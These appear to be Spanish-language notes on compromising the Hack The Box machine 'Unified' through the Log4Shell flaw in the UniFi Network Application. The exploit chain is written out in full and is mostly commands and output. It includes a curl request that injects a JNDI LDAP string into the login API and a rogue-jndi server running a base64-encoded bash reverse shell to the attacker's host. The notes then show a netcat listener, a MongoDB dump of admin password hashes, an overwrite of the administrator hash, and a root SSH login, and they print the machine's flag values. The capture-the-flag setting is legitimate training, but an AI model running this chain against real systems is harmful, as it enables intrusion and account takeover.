                                                             EXPLOTACIÓN UNIFIED
================================================================================================================================================================

**GATHERING INFO**
================================================================================================================================================================

SITIO DE REFERENCIA
-------------------
https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi


puzzlepeaches / Log4jUnifi
Exploiting CVE-2021-44228 in Unifi Network Application for remote code execution and more.



PAYLOAD
-------
POST /api/login HTTP/2
Host: <TARGET> 
Content-Length: 109
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Content-Type: application/json; charset=utf-8
Accept: */*
Origin: https://<TARGET>
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://<TARGET>/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}


**BREAKING IN**
================================================================================================================================================================

DNSLOG
------
http://dnslog.cn/

# curl -i -s -k -X POST -H $'Host: 192.168.11.10:8443' -H $'Content-Length: 108' --data-binary $'{\"username\":\"admin\",\"password\":\"admin\",\"remember\":\"${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://192.168.11.10:8443/api/login'


curl -i -s -k -X POST -H $'Host: unified:8443' -H $'Content-Length: 108' --data-binary $'{\"username\":\"admin\",\"password\":\"admin\",\"remember\":\"${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://unified:8443/api/login'

git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "192.168.11.50"

# GET A revershe shell

#Original comand:
curl -i -s -k -X POST -H $'Host: 192.168.11.10:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://192.168.11.50:1389/o=tomcat}\",\"strict\":true}' $'https://192.168.11.10:8443/api/login'


Para el comando final ver ./curl_get_revershe_shell.sh

Hay que tener muy en cuenta la longitud. 


 

echo '{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.163:1389/o=tomcat}","strict":true}' | wc -c
109

Al contar la longitud da 109. Hay que restarle 1 y la longitud queda en 108:

cat curl_get_revershe_shell.sh
#!/bin/bash
host=10.10.14.163
victim=10.129.141.95

curl -i -s -k -X POST -H $"Host: $victim:8443" -H 'Content-Length: 108' --data-binary $'{\"username\":\"admin\",\"password\":\"admin\",\"remember\":\"${jndi:ldap://10.10.14.163:1389/o=tomcat}\",\"strict\":true}' $"https://$victim:8443/api/login"


REPUESTA
========

Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Content-Length: 64
Date: Tue, 24 May 2022 19:57:04 GMT
Connection: close

{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}                                                                                                       
┌──(kali㉿kali)-[~/…/hackthebox/TIER2/unified/rogue-jndi]
└─$ 

SHELL INVERSA CONSEGUIDA
========================
─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.163] from (UNKNOWN) [10.129.141.95] 47518
ls
bin
data
dl
lib
logs
run
webapps
work


cd
bash: line 9: cd: /home/unifi: No such file or directory
cd /home/unifi
bash: line 10: cd: /home/unifi: No such file or directory
cd /home/
ls
michael
cd michael
ls
user.txt
cat user.txt
6ced1a6a89e666c0620cdb10262ba127 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<


CONSIGUIENDO SHELL
------------------
$ script /dev/null -c bash

**ESCALADA PRIVILEGIOS**
================================================================================================================================================================

1. SUDO
-------
listening on [any] 4444 ...
connect to [10.10.15.5] from (UNKNOWN) [10.129.153.25] 37402
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ sudo
sudo
bash: sudo: command not found
unifi@unified:/usr/lib/unifi$ 



2. SET UID BINARIES
---------------------

unifi@unified:/usr/lib/unifi$ find / -perm /4000 2>/dev/null > sudis.txt

unifi@unified:/usr/lib/unifi$ cat sudis.txt
cat sudis.txt
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
unifi@unified:/usr/lib/unifi$  





3. MONGODB
-----------
unifi@unified:/usr/lib/unifi/bin$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
.forEach(printjson);"e --eval "db.admin.find().
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : {
                "neverCheckForUpdate" : true,
                "statisticsPrefferedTZ" : "SITE",
                "statisticsPreferBps" : "",
                "tables" : {
                        "device" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "initialColumns" : [
                                        "type",
                                        "deviceName",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ],
                                "columns" : [
                                        "type",
                                        "deviceName",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ]
                        },
                        "client" : {
                                "sortBy" : "physicalName",
                                "isAscending" : true,
                                "initialColumns" : [
                                        "status",
                                        "clientName",
                                        "physicalName",
                                        "connection",
                                        "ip",
                                        "experience",
                                        "Downlink",
                                        "Uplink",
                                        "dailyUsage"
                                ],
                                "columns" : [
                                        "status",
                                        "clientName",
                                        "mac",
                                        "physicalName",
                                        "connection",
                                        "network",
                                        "interface",
                                        "wifi_band",
                                        "ip",
                                        "experience",
                                        "Downlink",
                                        "Uplink",
                                        "dailyUsage",
                                        "uptime",
                                        "channel",
                                        "Uplink_apPort",
                                        "signal",
                                        "txRate",
                                        "rxRate",
                                        "first_seen",
                                        "last_seen",
                                        "rx_packets",
                                        "tx_packets"
                                ],
                                "filters" : {
                                        "status" : {
                                                "active" : true
                                        },
                                        "connection_type" : {
                                                "ng" : true,
                                                "na" : true,
                                                "wired" : true,
                                                "vpn" : true
                                        },
                                        "clients_type" : {
                                                "users" : true,
                                                "guests" : true
                                        },
                                        "device" : {
                                                "device" : ""
                                        }
                                }
                        },
                        "unifiDevice" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceNetwork" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceAccess" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceProtect" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "unifiDeviceTalk" : {
                                "sortBy" : "type",
                                "isAscending" : true,
                                "columns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "macAddress",
                                        "model",
                                        "ipAddress",
                                        "connection",
                                        "network",
                                        "experience",
                                        "firmwareStatus",
                                        "firmwareVersion",
                                        "memoryUsage",
                                        "cpuUsage",
                                        "loadAverage",
                                        "utilization",
                                        "clients",
                                        "dailyUsage",
                                        "lastSeen",
                                        "downlink",
                                        "uplink",
                                        "uptime",
                                        "wlan2g",
                                        "wlan5g",
                                        "radio2g",
                                        "radio5g",
                                        "clients2g",
                                        "clients5g",
                                        "bssid",
                                        "tx",
                                        "rx",
                                        "tx2g",
                                        "tx5g",
                                        "channel",
                                        "channel2g",
                                        "channel5g"
                                ],
                                "initialColumns" : [
                                        "type",
                                        "name",
                                        "status",
                                        "connection",
                                        "network",
                                        "ipAddress",
                                        "experience",
                                        "firmwareStatus",
                                        "downlink",
                                        "uplink",
                                        "dailyUsage"
                                ]
                        },
                        "insights/wifiScanner" : {
                                "sortBy" : "apCount",
                                "isAscending" : false,
                                "initialColumns" : [
                                        "apCount",
                                        "essid",
                                        "bssid",
                                        "security",
                                        "radio",
                                        "signal",
                                        "channel",
                                        "band",
                                        "bw",
                                        "oui",
                                        "date",
                                        "ap_mac"
                                ],
                                "columns" : [
                                        "apCount",
                                        "essid",
                                        "bssid",
                                        "security",
                                        "radio",
                                        "signal",
                                        "channel",
                                        "band",
                                        "bw",
                                        "oui",
                                        "date",
                                        "ap_mac"
                                ]
                        },
                        "insights/wifiMan" : {
                                "sortBy" : "date",
                                "isAscending" : false,
                                "initialColumns" : [
                                        "clinet_name",
                                        "client_wifi_experience",
                                        "device_model",
                                        "device_name",
                                        "wlan_essid",
                                        "client_signal",
                                        "wlan_channel_width",
                                        "down",
                                        "up",
                                        "endPoint",
                                        "rate",
                                        "date"
                                ],
                                "columns" : [
                                        "clinet_name",
                                        "client_wifi_experience",
                                        "device_model",
                                        "device_name",
                                        "wlan_essid",
                                        "client_signal",
                                        "wlan_channel_width",
                                        "down",
                                        "up",
                                        "endPoint",
                                        "rate",
                                        "date"
                                ]
                        }
                },
                "topologyViewSettings" : {
                        "showAllDevices" : true,
                        "showAllClients" : true,
                        "show2GClients" : true,
                        "show5GClients" : true,
                        "showWiredClients" : true,
                        "showSSID" : false,
                        "showWifiExperience" : true,
                        "showRadioChannel" : false,
                        "showWifiStandards" : false,
                        "showWiredSpeed" : false,
                        "showWiredPorts" : false,
                        "online" : true,
                        "offline" : true,
                        "isolated" : true,
                        "pending_adoption" : true,
                        "managed_by_another_console" : true
                },
                "preferences" : {
                        "alertsPosition" : "top_right",
                        "allowHiddenDashboardModules" : false,
                        "browserLogLevel" : "INFO",
                        "bypassAutoFindDevices" : false,
                        "bypassConfirmAdoptAndUpgrade" : false,
                        "bypassConfirmBlock" : false,
                        "bypassConfirmRestart" : false,
                        "bypassConfirmUpgrade" : false,
                        "bypassHybridDashboardNotice" : false,
                        "bypassDashboardUdmProAd" : false,
                        "bypassHybridSettingsNotice" : false,
                        "dateFormat" : "MMM DD YYYY",
                        "dismissWlanOverrides" : false,
                        "enableNewUI" : false,
                        "hideV3SettingsIntro" : true,
                        "isAppDark" : true,
                        "isPropertyPanelFixed" : true,
                        "isRegularGraphForAirViewEnabled" : false,
                        "isResponsive" : false,
                        "isSettingsDark" : true,
                        "isUndockedByDefault" : false,
                        "noWhatsNew" : false,
                        "propertyPanelCollapse" : false,
                        "propertyPanelMultiMode" : true,
                        "refreshButtonEnabled" : false,
                        "refreshRate" : "2MIN",
                        "refreshRateRememberAll" : false,
                        "rowsPerPage" : 50,
                        "showAllPanelActions" : false,
                        "showWifimanAppsBanner" : true,
                        "timeFormat" : "H:mm",
                        "use24HourTime" : true,
                        "useBrowserTheme" : false,
                        "useSettingsPanelView" : false,
                        "websocketEnabled" : true,
                        "withStickyTableActions" : true,
                        "isUlteModalClosed" : false,
                        "isUbbAlignmentToolModalClosed" : false,
                        "offlineClientTimeframe" : 24
                },
                "preferredLanguage" : "en",
                "dashboardConfig" : {
                        "lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
                }
        },
        "requires_new_password" : false,
        "email_alert_enabled" : true,
        "email_alert_grouping_enabled" : true,
        "html_email_enabled" : true,
        "is_professional_installer" : false,
        "push_alert_enabled" : true
}
{
        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640909411),
        "last_site_name" : "default",
        "email_alert_enabled" : false,
        "email_alert_grouping_enabled" : false,
        "email_alert_grouping_delay" : 60,
        "push_alert_enabled" : false
}
{
        "_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
        "email" : "seamus@unified.htb",
        "name" : "Seamus",
        "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910056),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d27fbce5e00116f4252"),
        "email" : "warren@unified.htb",
        "name" : "warren",
        "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910119),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d51fbce5e00116f4253"),
        "email" : "james@unfiied.htb",
        "name" : "james",
        "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640910161),
        "last_site_name" : "default"
}
unifi@unified:/usr/lib/unifi/bin$ 


cat hashes.txt | sed -e 's/"x_shadow"//g' | tr ':' ' ' | sed -e 's/"//g' | sed -e 's/,//g' > clean_hashes.txt

La contraseña no se puede crackear

CAMBIO DE CONTRASEÑA ADMINISTRADOR en MONGODB por UNA PROPIA
================================================================================================================================================================

MONGO
=====
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
10.129.237.149


Creamos nueva contraseña en local
----------------------------------
La contraseña es de tipo SHA512 (por el $6)

└─$ mkpasswd -m sha-512 Password1234
$6$fkPl.lGMhk9oxMdp$.KRwdtLB3YlWLhf0w6lu/swzjPc5VQK1P.6rkwapa.xB1v28/6HPm4lGF37gUJCaaNi2vV6.3G4w6O4NSX1bC/

En máquina victima
------------------
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$fkPl.lGMhk9oxMdp$.KRwdtLB3YlWLhf0w6lu/swzjPc5VQK1P.6rkwapa.xB1v28/6HPm4lGF37gUJCaaNi2vV6.3G4w6O4NSX1bC/"}})'


Verificando contraseña cambiada:
---------------------------
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" | grep -B5 "1bC"


NotACrackablePassword4U2022



┌──(kali㉿kali)-[~/Hacking/hackthebox/TIER2/unified]
└─$ ssh root@unified    
The authenticity of host 'unified (10.129.237.149)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'unified' (ED25519) to the list of known hosts.
root@unified's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


root@unified:~# whoami
root
root@unified:~# cd
root@unified:~# ls
root.txt
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681  <<<<<<<<<<<<<<<<<<<<<<<<

